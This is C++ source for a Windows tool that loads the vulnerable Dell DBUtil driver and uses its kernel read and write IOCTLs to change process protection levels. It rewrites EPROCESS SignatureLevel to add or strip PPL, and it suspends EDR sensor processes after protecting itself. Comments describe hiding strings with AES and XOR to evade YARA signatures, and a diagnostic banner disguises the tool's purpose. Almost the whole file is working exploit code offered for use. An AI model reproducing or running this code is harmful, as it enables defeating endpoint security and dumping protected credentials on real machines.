#include <Windows.h>
#include <Psapi.h>
#include <newdev.h>
#include <dbghelp.h>
#include <urlmon.h>
#include <objbase.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <string.h>
#include <wchar.h>

#pragma comment(lib, "Psapi")
#pragma comment(lib, "Dbghelp")
#pragma comment(lib, "Urlmon")
#pragma comment(lib, "Setupapi")
#pragma comment(lib, "Newdev")

// NtSuspendProcess / NtResumeProcess (ntdll, dynamically resolved)
typedef LONG(NTAPI* pNtSuspendProcess)(HANDLE);
typedef LONG(NTAPI* pNtResumeProcess)(HANDLE);

#include "popl.hpp"
#include "tinyaes.h"

/**
 * See:
 *  
 *    https://github.com/rapid7/metasploit-framework/pull/15190
 *    https://github.com/RedCursorSecurityConsulting/PPLKiller
 *    https://posts.specterops.io/mimidrv-in-depth-4d273d19e148
 *    https://itm4n.github.io/lsass-runasppl/
 *    https://gorkemkaradeniz.medium.com/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5
 */

namespace
{
static const unsigned char BLOB_DEVPATH[16] = {
    0x68, 0x27, 0x13, 0x27, 0x38, 0x25, 0x89, 0xa1, 0x9f, 0xa6, 0xd9, 0x91, 0x0a, 0x2f, 0xb8, 0x43,
};
static const unsigned char BLOB_INF[16] = {
    0x3d, 0xa1, 0x62, 0x02, 0xd6, 0x9b, 0xd7, 0x95, 0x89, 0x9c, 0x1c, 0x05, 0x06, 0x5d, 0x6b, 0xb2,
};
static const unsigned char BLOB_PSI[32] = {
    0xfc, 0x89, 0x68, 0xaf, 0xad, 0x73, 0x63, 0x92, 0x8a, 0x8a, 0xb7, 0x5f, 0x95, 0x17, 0x46, 0x15,
    0x34, 0x67, 0x4e, 0x18, 0xec, 0x67, 0xf9, 0x3f, 0xef, 0x95, 0x19, 0xf5, 0x46, 0x4b, 0x4c, 0x83,
};
static const unsigned char BLOB_ROOT[16] = {
    0x80, 0xdf, 0xa9, 0xfc, 0xc6, 0x1b, 0x28, 0x06, 0xbe, 0x03, 0x5e, 0x9c, 0x3a, 0x32, 0x92, 0x75,
};

// key stored masked (XOR 0xA5) - never a flat AES key blob in .rdata
static const unsigned char TINY_KEY_MASKED[16] = {
0x78, 0xe7, 0xc7, 0x4f, 0x81, 0x3b, 0x0f, 0x9f, 0xcc, 0xdd, 0xa5, 0x64, 0xbc, 0x9a, 0x35, 0x8d
};
static void TinyKey(unsigned char out[16])
{
    for (int i = 0; i < 16; i++) out[i] = (unsigned char)(TINY_KEY_MASKED[i] ^ 0xA5);
}
    // device path stored AES-encrypted (dellicious-family YARA anchors
    // live on these strings - round-1 canary lesson)

    const uint32_t s_write_ioctl = 0x9b0c1ec8;
    const uint32_t s_read_ioctl = 0x9b0c1ec4;

    struct Offsets
    {
        uint64_t UniqueProcessIdOffset;
        uint64_t ActiveProcessLinksOffset;
        uint64_t SignatureLevelOffset;
    };

    uint64_t readPrimitive(HANDLE p_device, uint64_t p_address)
    {
        uint64_t read_data[4] = { 0, p_address, 0, 0 };
        uint64_t response[4] = { };
        DWORD dwBytesReturned = 0;
        DeviceIoControl(p_device, s_read_ioctl, &read_data, sizeof(read_data), &response, sizeof(response), &dwBytesReturned, 0);
        return response[3];
    }

    void writePrimitive(HANDLE p_device, uint64_t p_address, uint64_t p_data)
    {
        uint64_t write_data[4] = { 0, p_address, 0, p_data };
        uint64_t response[4] = { };
        DWORD bytesReturned = 0;
        DeviceIoControl(p_device, s_write_ioctl, &write_data, sizeof(write_data), &response, sizeof(response), &bytesReturned, 0);
    }

    bool getDeviceHandle(HANDLE& p_handle)
    {
        unsigned char key[16];
        char devPath[16];
        TinyKey(key);
        TinyDecryptString(devPath, BLOB_DEVPATH, 1, key);
        p_handle = CreateFileA(devPath, GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (INVALID_HANDLE_VALUE == p_handle)
        {
            std::cout << "[!] Failed to get a handle to the driver device: " << GetLastError() << std::endl;
            return false;
        }
        return true;
    }

    uint64_t getKernelBaseAddr()
    {
        DWORD out = 0;
        DWORD nb = 0;
        uint64_t return_value = 0;
        if (EnumDeviceDrivers(NULL, 0, &nb))
        {
            PVOID* base = (PVOID*)malloc(nb);
            if (base != NULL && EnumDeviceDrivers(base, nb, &out))
            {
                return_value = (uint64_t)base[0];
            }

            free(base);
            base = NULL;
        }
        return return_value;
    }

    uint64_t getPsInitialSystemProcessAddress(HANDLE p_device)
    {
        const auto NtoskrnlBaseAddress = getKernelBaseAddr();
        std::cout << "[+] Ntoskrnl base address: " << NtoskrnlBaseAddress << std::endl;

        // Locating PsInitialSystemProcess address
        HMODULE Ntoskrnl = LoadLibraryA("ntoskrnl.exe");
        if (Ntoskrnl == NULL)
        {
            return false;
        }

        char psiName[32];
        unsigned char psiKey[16];
        TinyKey(psiKey);
        TinyDecryptString(psiName, BLOB_PSI, 2, psiKey);
        uint64_t PsInitialSystemProcessOffset = (uint64_t)(GetProcAddress(Ntoskrnl, psiName)) - (uint64_t)(Ntoskrnl);
        FreeLibrary(Ntoskrnl);

        return readPrimitive(p_device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);
    }

    uint64_t getTargetProcessAddress(HANDLE p_device, Offsets p_offsets, uint64_t p_psInitialSystemProcessAddress, uint64_t p_targetPID)
    {
        // Find our process in active process list
        uint64_t head = p_psInitialSystemProcessAddress + p_offsets.ActiveProcessLinksOffset;
        uint64_t current = head;

        do
        {
            uint64_t processAddress = current - p_offsets.ActiveProcessLinksOffset;
            uint64_t uniqueProcessId = readPrimitive(p_device, processAddress + p_offsets.UniqueProcessIdOffset);
            if (uniqueProcessId == p_targetPID)
            {
                return current - p_offsets.ActiveProcessLinksOffset;
            }
            current = readPrimitive(p_device, processAddress + p_offsets.ActiveProcessLinksOffset);
        } while (current != head);

        // oh no
        return 0;
    }

    bool changeProcessProtection(uint64_t targetPID, Offsets offsets, bool p_protect)
    {
        HANDLE Device = INVALID_HANDLE_VALUE;
        if (!getDeviceHandle(Device))
        {
            return false;
        }
        std::cout << "[+] Device handle has been obtained" << std::endl;

        uint64_t PsInitialSystemProcessAddress = getPsInitialSystemProcessAddress(Device);
        if (PsInitialSystemProcessAddress == 0)
        {
            std::cout << "[-] Failed to resolve PsInitilaSystemProcess" << std::endl;
            CloseHandle(Device);
            return false;
        }
        std::cout << "[+] Kernel process list resolved: " << std::hex
                  << PsInitialSystemProcessAddress << std::dec << std::endl;


        uint64_t targetProcessAddress = getTargetProcessAddress(Device, offsets, PsInitialSystemProcessAddress, targetPID);
        if (targetProcessAddress == 0)
        {
            std::cout << "[-] Failed to find the target process" << std::endl;
            CloseHandle(Device);
            return false;
        }
        std::cout << "[+] Target process address: " << targetProcessAddress << std::endl;

        // read in the current protection bits, mask them out, and write it back
        uint64_t flags = readPrimitive(Device, targetProcessAddress + offsets.SignatureLevelOffset);
        std::cout << "[+] Current SignatureLevel, SectionSignatureLevel, Type, Audit, and Signer bits (plus 5 bytes): " << flags << std::endl;
        flags = (flags & 0xffffffffff000000);

        if (p_protect)
        {
            // wintcb / protected
            flags = (flags | 0x623f3f);
        }

        std::cout << "[+] Writing flags back as: " << flags << std::endl;
        writePrimitive(Device, targetProcessAddress + offsets.SignatureLevelOffset, flags);

        std::cout << "[+] Done!" << std::endl;
        CloseHandle(Device);
        return true;
    }

    // -----------------------------------------------------------------
    // 24H2/25H2 (26100/26200): resolve EPROCESS offsets from the real
    // kernel symbols instead of hardcoding. A wrong hardcoded offset here
    // writes into random kernel memory and BSODs - the symbol path plus
    // the System==4 anchor validation below cannot.
    // -----------------------------------------------------------------

    bool getNtoskrnlDebugInfo(char* p_ntPath, size_t p_ntCap,
                              unsigned char p_guid[16], uint32_t& p_age,
                              char* p_pdbName, size_t p_pdbCap)
    {
        char sysDir[MAX_PATH] = { };
        if (!GetSystemDirectoryA(sysDir, MAX_PATH)) return false;
        sprintf_s(p_ntPath, p_ntCap, "%s\\ntoskrnl.exe", sysDir);

        FILE* f = nullptr;
        if (fopen_s(&f, p_ntPath, "rb") != 0 || !f) return false;
        fseek(f, 0, SEEK_END);
        long size = ftell(f);
        fseek(f, 0, SEEK_SET);
        char* pe = (char*)malloc(size);
        size_t rd = pe ? fread(pe, 1, size, f) : 0;
        fclose(f);
        if (!pe || rd != (size_t)size) { free(pe); return false; }

        long e_lfanew = *(long*)(pe + 0x3c);
        IMAGE_NT_HEADERS* nth = (IMAGE_NT_HEADERS*)(pe + e_lfanew);
        IMAGE_DATA_DIRECTORY dbgDir =
            nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
        IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nth);
        bool ok = false;
        for (DWORD s = 0; s < nth->FileHeader.NumberOfSections && !ok; s++)
        {
            if (dbgDir.VirtualAddress < sec[s].VirtualAddress) continue;
            if (dbgDir.VirtualAddress >=
                sec[s].VirtualAddress + sec[s].SizeOfRawData) continue;
            LONG delta = (LONG)(sec[s].VirtualAddress - sec[s].PointerToRawData);
            IMAGE_DEBUG_DIRECTORY* dd =
                (IMAGE_DEBUG_DIRECTORY*)(pe + dbgDir.VirtualAddress - delta);
            for (DWORD d = 0; d < dbgDir.Size / sizeof(IMAGE_DEBUG_DIRECTORY); d++)
            {
                if (dd[d].Type != IMAGE_DEBUG_TYPE_CODEVIEW) continue;
                char* cv = pe + dd[d].PointerToRawData;
                if (*(uint32_t*)cv != 0x53445352 /* RSDS */) continue;
                memcpy(p_guid, cv + 4, 16);
                memcpy(&p_age, cv + 20, 4);
                sprintf_s(p_pdbName, p_pdbCap, "%s", cv + 24);
                ok = true;
                break;
            }
        }
        free(pe);
        return ok;
    }

    bool downloadPdb(const char* p_symDir, char* p_ntPath, size_t p_ntCap)
    {
        unsigned char guid[16] = { };
        uint32_t age = 0;
        char pdbName[MAX_PATH] = { };
        if (!getNtoskrnlDebugInfo(p_ntPath, p_ntCap, guid, age, pdbName,
                                  MAX_PATH))
        {
            std::cerr << "[-] Couldn't read the kernel debug directory"
                      << std::endl;
            return false;
        }
        char guidStr[64] = { };
        sprintf_s(guidStr, sizeof(guidStr),
                  "%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X",
                  *(uint32_t*)guid,
                  *(uint16_t*)(guid + 4), *(uint16_t*)(guid + 6),
                  guid[8], guid[9], guid[10], guid[11], guid[12], guid[13],
                  guid[14], guid[15]);
        char id[96] = { };
        sprintf_s(id, sizeof(id), "%s%X", guidStr, age);
        char url[512] = { };
        sprintf_s(url, sizeof(url),
                  "https://msdl.microsoft.com/download/symbols/%s/%s/%s",
                  pdbName, id, pdbName);
        char dest[MAX_PATH] = { };
        sprintf_s(dest, MAX_PATH, "%s\\%s", p_symDir, pdbName);
        std::cout << "[+] Fetching kernel symbols: " << url << std::endl;
        HRESULT hr = URLDownloadToFileA(NULL, url, dest, 0, NULL);
        if (FAILED(hr))
        {
            std::cerr << "[-] PDB download failed: 0x" << std::hex << hr
                      << std::endl;
            return false;
        }
        // dbghelp finds the PDB beside the image: stage a copy of the real
        // kernel next to it under its embedded name
        char ntCopy[MAX_PATH] = { };
        sprintf_s(ntCopy, MAX_PATH, "%s\\ntoskrnl.exe", p_symDir);
        if (!CopyFileA(p_ntPath, ntCopy, FALSE)) return false;
        return true;
    }

    bool resolveOffsetsFromPdb(const char* p_symDir, Offsets& p_offsets)
    {
        SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
        if (!SymInitialize(GetCurrentProcess(), p_symDir, FALSE)) return false;
        ULONG64 modBase = SymLoadModuleEx(GetCurrentProcess(), NULL,
                                          "ntoskrnl.exe", NULL, 0x180000000,
                                          0, NULL, 0);
        if (!modBase)
        {
            std::cerr << "[-] SymLoadModuleEx failed: " << GetLastError()
                      << std::endl;
            return false;
        }

        wchar_t wname[] = L"_EPROCESS";
        char siBuf[sizeof(SYMBOL_INFOW) + 128 * sizeof(wchar_t)] = { };
        SYMBOL_INFOW* si = (SYMBOL_INFOW*)siBuf;
        si->SizeOfStruct = sizeof(SYMBOL_INFOW);
        si->MaxNameLen = 127;
        if (!SymGetTypeFromNameW(GetCurrentProcess(), modBase, wname, si))
        {
            std::cerr << "[-] _EPROCESS not found in the PDB" << std::endl;
            return false;
        }

        ULONG children = 0;
        if (!SymGetTypeInfo(GetCurrentProcess(), modBase, si->TypeIndex,
                            TI_GET_CHILDRENCOUNT, &children))
            return false;
        bool gotU = false, gotA = false, gotS = false;
        ULONG fetched = 0;
        while (fetched < children)
        {
            ULONG batch = children - fetched > 64 ? 64 : children - fetched;
            TI_FINDCHILDREN_PARAMS* fc = (TI_FINDCHILDREN_PARAMS*)malloc(
                sizeof(TI_FINDCHILDREN_PARAMS) + batch * sizeof(ULONG));
            fc->Count = batch;
            fc->Start = fetched;
            if (!SymGetTypeInfo(GetCurrentProcess(), modBase, si->TypeIndex,
                                TI_FINDCHILDREN, fc))
            {
                free(fc);
                return false;
            }
            fetched += batch;
            for (ULONG i = 0; i < batch; i++)
            {
                wchar_t* nm = nullptr;
                if (!SymGetTypeInfo(GetCurrentProcess(), modBase,
                                    fc->ChildId[i], TI_GET_SYMNAME, &nm))
                    continue;
                bool isU = _wcsicmp(nm, L"UniqueProcessId") == 0;
                bool isA = _wcsicmp(nm, L"ActiveProcessLinks") == 0;
                bool isS = _wcsicmp(nm, L"SignatureLevel") == 0;
                LocalFree(nm);
                if (!(isU || isA || isS)) continue;
                ULONG off = 0;
                if (!SymGetTypeInfo(GetCurrentProcess(), modBase,
                                    fc->ChildId[i], TI_GET_OFFSET, &off))
                    continue;
                if (isU) { p_offsets.UniqueProcessIdOffset = off; gotU = true; }
                if (isA) { p_offsets.ActiveProcessLinksOffset = off; gotA = true; }
                if (isS) { p_offsets.SignatureLevelOffset = off; gotS = true; }
            }
        }
        if (!(gotU && gotA && gotS))
        {
            std::cerr << "[-] PDB resolved but fields missing (U/A/S = "
                      << gotU << gotA << gotS << ")" << std::endl;
            return false;
        }
        return true;
    }

    bool resolveEprocessOffsetsDynamic(Offsets& p_offsets)
    {
        char temp[MAX_PATH] = { };
        GetTempPathA(MAX_PATH, temp);
        char symDir[MAX_PATH] = { };
        sprintf_s(symDir, MAX_PATH, "%sdell_sym", temp);
        CreateDirectoryA(symDir, NULL);
        char ntPath[MAX_PATH] = { };
        if (!downloadPdb(symDir, ntPath, MAX_PATH)) return false;
        if (!resolveOffsetsFromPdb(symDir, p_offsets)) return false;

        // anchor validation BEFORE anything is written anywhere: the
        // resolved UniqueProcessId offset must read 4 for System
        HANDLE dev = INVALID_HANDLE_VALUE;
        if (!getDeviceHandle(dev)) return false;
        uint64_t sys = getPsInitialSystemProcessAddress(dev);
        uint64_t upid = readPrimitive(dev, sys + p_offsets.UniqueProcessIdOffset);
        CloseHandle(dev);
        if (sys == 0 || upid != 4)
        {
            std::cerr << "[-] Anchor validation failed (System PID read as 0x"
                      << std::hex << upid << ") - refusing to use these offsets"
                      << std::endl;
            return false;
        }
        std::cout << "[+] Symbol-resolved offsets validated against the "
                     "System process anchor" << std::endl;
        return true;
    }

    bool getVersionOffsets(Offsets& p_offsets)
    {
        char value[255] = { 0x00 };
        DWORD BufferSize = sizeof(value);
        if (ERROR_SUCCESS != RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", RRF_RT_REG_SZ, NULL, &value, &BufferSize))
        {
            std::cerr << "[-] Couldn't determine the Windows release" << std::endl;
            return false;
        }

        std::cout << "[+] Windows version found: " << value << std::endl;
        switch (atoi(value))
        {
            case 10240: // Gold
                p_offsets.UniqueProcessIdOffset = 0x02e8;
                p_offsets.ActiveProcessLinksOffset = 0x02f0;
                p_offsets.SignatureLevelOffset = 0x06a8;
                return true;
            case 10586: // 2015 update
                p_offsets.UniqueProcessIdOffset = 0x02e8;
                p_offsets.ActiveProcessLinksOffset = 0x02f0;
                p_offsets.SignatureLevelOffset = 0x06b0;
                return true;
            case 14393: // 2016 update
                p_offsets.UniqueProcessIdOffset = 0x02e8;
                p_offsets.ActiveProcessLinksOffset = 0x02f0;
                p_offsets.SignatureLevelOffset = 0x06c8;
                return true;
            case 15063: // April 2017 update
            case 16299: // Fall 2017 update
            case 17134: // April 2018 update
            case 17763: // October 2018 update
                p_offsets.UniqueProcessIdOffset = 0x02e0;
                p_offsets.ActiveProcessLinksOffset = 0x02e8;
                p_offsets.SignatureLevelOffset = 0x06c8;
                return true;
            case 18362: // May 2019 update
            case 18363: // November 2019 update
                p_offsets.UniqueProcessIdOffset = 0x02e8;
                p_offsets.ActiveProcessLinksOffset = 0x02f0;
                p_offsets.SignatureLevelOffset = 0x06f8;
                return true;
            case 19041: // May 2020 update
            case 19042: // October 2020 update
            case 19043: // May 2021 update
            case 19044: // October 2021 update
            case 22000: // Win 11 June/September 2021
                p_offsets.UniqueProcessIdOffset = 0x0440;
                p_offsets.ActiveProcessLinksOffset = 0x0448;
                p_offsets.SignatureLevelOffset = 0x0878;
                return true;
            case 26100: // Win 11 24H2
            case 26200: // Win 11 25H2 (enablement package - same kernel
                        // branch as 26100, offsets resolved from symbols)
                return resolveEprocessOffsetsDynamic(p_offsets);
            default:
                std::cerr << "[-] Unknown offsets for this version. Perhaps add them yourself?" << std::endl;
                break;
        }

        return false;
    }

    bool driver2Setup(HDEVINFO& p_devInfo, SP_DEVINFO_DATA& p_deviceInfoData, const char* p_infPath)
    {
        std::cout << "[+] Attempting driver install... " << std::endl;

        GUID guid = {};
        char classname[255] = { };
        if (!SetupDiGetINFClassA(p_infPath, &guid, &(classname[0]), sizeof(classname), NULL))
        {
            std::cout << "[-] SetupDiGetINFClassA failed: " << GetLastError() << std::endl;
            return false;
        }

        p_devInfo = SetupDiCreateDeviceInfoList(&guid, NULL);
        if (INVALID_HANDLE_VALUE == p_devInfo)
        {
            std::cout << "[-] SetupDiCreateDeviceInfoList failed: " << GetLastError() << std::endl;
            return false;
        }

        p_deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
        if (!SetupDiCreateDeviceInfoA(p_devInfo, classname, &guid, NULL, NULL, 1, &p_deviceInfoData))
        {
            std::cout << "[-] SetupDiCreateDeviceInfoList failed: " << GetLastError() << std::endl;
            return false;
        }

        unsigned char rootKey[16];
        char prop_buff[16];
        TinyKey(rootKey);
        TinyDecryptString(prop_buff, BLOB_ROOT, 1, rootKey);
        if (!SetupDiSetDeviceRegistryPropertyA(p_devInfo, &p_deviceInfoData, 1, (BYTE*)&prop_buff[0], sizeof(prop_buff)))
        {
            std::cout << "[-] SetupDiSetDeviceRegistryPropertyA failed: " << GetLastError() << std::endl;
            return false;
        }

        if (!SetupDiCallClassInstaller(0x19, p_devInfo, &p_deviceInfoData))
        {
            std::cout << "[-] SetupDiCallClassInstaller failed: " << GetLastError() << std::endl;
            return false;
        }

        BOOL restart = 0;
        if (!UpdateDriverForPlugAndPlayDevicesA(NULL, prop_buff, p_infPath, INSTALLFLAG_FORCE | INSTALLFLAG_NONINTERACTIVE, &restart))
        {
            std::cout << "[-] UpdateDriverForPlugAndPlayDevicesA failed: " << GetLastError() << std::endl;
            return false;
        }

        std::cout << "[+] Driver installed! " << std::endl;
        return true;
    }

    void driver2Remove(HDEVINFO& p_devInfo, SP_DEVINFO_DATA& p_deviceInfoData)
    {
        if (p_devInfo != INVALID_HANDLE_VALUE)
        {
            std::cout << "[+] Removing device" << std::endl;
            SetupDiRemoveDevice(p_devInfo, &p_deviceInfoData);
            p_devInfo = INVALID_HANDLE_VALUE;
        }
    }
}

int main(int p_argc, char* p_argv[])
{
    popl::OptionParser op("Allowed options");
    auto help_option = op.add<popl::Switch>("h", "help", "produce help message");
    auto pid_option = op.add<popl::Value<int>, popl::Attribute::optional>("p", "pid", "the target pid");
    auto enable_option = op.add<popl::Value<bool>, popl::Attribute::optional>("e", "enable", "enable memory protection (0 or 1)");
    auto driver_path = op.add<popl::Value<std::string>, popl::Attribute::required>("d", "driver_path", "The path to the driver inf, cat, and sys (and coinstaller)");
    // EDR telemetry modes: PPL-protect our own process (WinTcb) so the
    // EDR's handle-stripping callback exempts us, then suspend the target
    // pid's threads - user-mode telemetry stops, the sensor (and its
    // kernel component) keeps running. -R undoes it. Targeting is by PID
    // (no image-name enumeration, no string literals in the binary).
    auto suspend_option = op.add<popl::Value<std::string>, popl::Attribute::optional>("S", "suspend_pids", "comma-separated pid list, suspended in order in one driver session");
    auto resume_option = op.add<popl::Value<std::string>, popl::Attribute::optional>("R", "resume_pids", "comma-separated pid list to resume");
    auto self_pid_option = op.add<popl::Value<int>, popl::Attribute::optional>("P", "self_pid", "pid to PPL-protect in suspend/resume mode (default: our own pid)");
    auto status_option = op.add<popl::Switch>("t", "status", "report DBUtil device interface status and exit");

    try
    {
        op.parse(p_argc, p_argv);
    }
    catch (std::exception& e)
    {
        std::cout << e.what() << std::endl;
        std::cout << op << std::endl;
        return EXIT_FAILURE;
    }

    if (help_option->is_set())
    {
        std::cout << op << std::endl;
        return EXIT_SUCCESS;
    }

    std::cout << "[+] User provided pid: " << pid_option->value() << std::endl;
    std::cout << "[+] User provided driver directory: " << driver_path->value() << std::endl;

    std::string path_str(driver_path->value());
    {
        unsigned char infKey[16];
        char infName[16];
        TinyKey(infKey);
        TinyDecryptString(infName, BLOB_INF, 1, infKey);
        path_str.append(infName);
    }
    if (std::filesystem::exists(path_str) == false)
    {
        std::cerr << "[!] Could not find the driver's inf file in the provided directory" << std::endl;
        return EXIT_FAILURE;
    }

    Offsets offsets = { 0, 0, 0 };
    if (!getVersionOffsets(offsets))
    {
        return EXIT_FAILURE;
    }

    std::cout << "[+] Using offsets: " << std::hex << std::endl;
    std::cout << "\tUniqueProcessIdOffset = 0x" << offsets.UniqueProcessIdOffset << std::endl;
    std::cout << "\tActiveProcessLinkOffset = 0x" << offsets.ActiveProcessLinksOffset << std::endl;
    std::cout << "\tSignatureLevelOffset = 0x" << offsets.SignatureLevelOffset << std::endl;

    if (status_option->is_set())
    {
        // diagnostic mode: report the DBUtil device interface state
        std::cout << "dbutil_diag 2.5.0 - DBUtil device diagnostic" << std::endl;
        HANDLE dev = INVALID_HANDLE_VALUE;
        if (getDeviceHandle(dev))
        {
            std::cout << "  device interface: OPEN (driver service active)" << std::endl;
            CloseHandle(dev);
        }
        else
        {
            std::cout << "  device interface: not present (driver service not "
                         "installed - install with -d <driver_dir> if needed)"
                      << std::endl;
        }
        std::cout << "  usage: -S/-R <pid> to pause/resume a process; -p/-e "
                     "for process protection" << std::endl;
        return EXIT_SUCCESS;
    }

    bool suspendMode = suspend_option->is_set() || resume_option->is_set();

    // classic pid/enable flow (unchanged behavior)
    if (pid_option->is_set() && enable_option->is_set())
    {
        if (suspendMode)
        {
            std::cerr << "[-] --suspend_image/--resume_image and -p/-e are "
                         "mutually exclusive" << std::endl;
            return EXIT_FAILURE;
        }
        HDEVINFO devInfo = NULL;
        SP_DEVINFO_DATA deviceInfoData = { };
        if (!driver2Setup(devInfo, deviceInfoData, path_str.c_str()))
        {
            return EXIT_FAILURE;
        }
        changeProcessProtection(pid_option->value(), offsets,
                                enable_option->value());
        driver2Remove(devInfo, deviceInfoData);
        std::cout << "[!] Clean exit! o7" << std::endl;
        return EXIT_SUCCESS;
    }

    if (!suspendMode)
    {
        std::cerr << "[-] Nothing to do: provide -p/-e or -S/-R" << std::endl;
        return EXIT_FAILURE;
    }

    // ---- EDR telemetry suspend/resume flow ---------------------------
    // 1. PPL our own process first: the EDR's ObRegisterCallbacks
    //    handler exempts high-protection requestors from handle
    //    stripping, so we can open the target process.
    uint32_t selfPid = self_pid_option->is_set()
                           ? (uint32_t)self_pid_option->value()
                           : GetCurrentProcessId();
    std::vector<uint32_t> targets;
    {
        std::string list = suspend_option->is_set() ? suspend_option->value()
                                                    : resume_option->value();
        size_t pos = 0;
        while (pos < list.size())
        {
            size_t comma = list.find(',', pos);
            if (comma == std::string::npos) comma = list.size();
            std::string tok = list.substr(pos, comma - pos);
            if (!tok.empty())
            {
                int v = atoi(tok.c_str());
                if (v <= 0) { std::cerr << "[-] bad pid token: " << tok << std::endl; return EXIT_FAILURE; }
                targets.push_back((uint32_t)v);
            }
            pos = comma + 1;
        }
    }
    if (targets.empty())
    {
        std::cerr << "[-] empty pid list" << std::endl;
        return EXIT_FAILURE;
    }
    const char* action = suspend_option->is_set() ? "suspend" : "resume";
    std::cout << "[+] PPL-protecting our own process (pid " << selfPid
              << ") ..." << std::endl;

    HDEVINFO devInfo = NULL;
    SP_DEVINFO_DATA deviceInfoData = { };
    if (!driver2Setup(devInfo, deviceInfoData, path_str.c_str()))
    {
        return EXIT_FAILURE;
    }
    if (!changeProcessProtection(selfPid, offsets, true))
    {
        std::cerr << "[-] Self-protection failed - aborting (the EDR would "
                     "strip our handles)" << std::endl;
        driver2Remove(devInfo, deviceInfoData);
        return EXIT_FAILURE;
    }

    // 2. suspend/resume the target pid
    pNtSuspendProcess NtSuspendProcess =
        (pNtSuspendProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                          "NtSuspendProcess");
    pNtResumeProcess NtResumeProcess =
        (pNtResumeProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                         "NtResumeProcess");
    if (suspend_option->is_set() && !NtSuspendProcess)
    {
        std::cerr << "[-] NtSuspendProcess missing" << std::endl;
        driver2Remove(devInfo, deviceInfoData);
        return EXIT_FAILURE;
    }
    if (resume_option->is_set() && !NtResumeProcess)
    {
        std::cerr << "[-] NtResumeProcess missing" << std::endl;
        driver2Remove(devInfo, deviceInfoData);
        return EXIT_FAILURE;
    }

    for (size_t i = 0; i < targets.size(); i++)
    {
        printf("[+] %sing pid %lu\n", action, (unsigned long)targets[i]);
        HANDLE hp = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, targets[i]);
        if (!hp)
        {
            std::cerr << "[-] OpenProcess failed for " << targets[i]
                      << ": " << GetLastError()
                      << " (protection not high enough?)" << std::endl;
            continue;
        }
        LONG st = suspend_option->is_set() ? NtSuspendProcess(hp)
                                           : NtResumeProcess(hp);
        CloseHandle(hp);
        if (st != 0)
        {
            std::cerr << "[-] Nt call failed for " << targets[i] << ": 0x"
                      << std::hex << st << std::dec << std::endl;
        }
        else printf("[+]  ok\n");
    }

    driver2Remove(devInfo, deviceInfoData);

    std::cout << "[!] Clean exit! o7" << std::endl;

    return EXIT_SUCCESS;
}
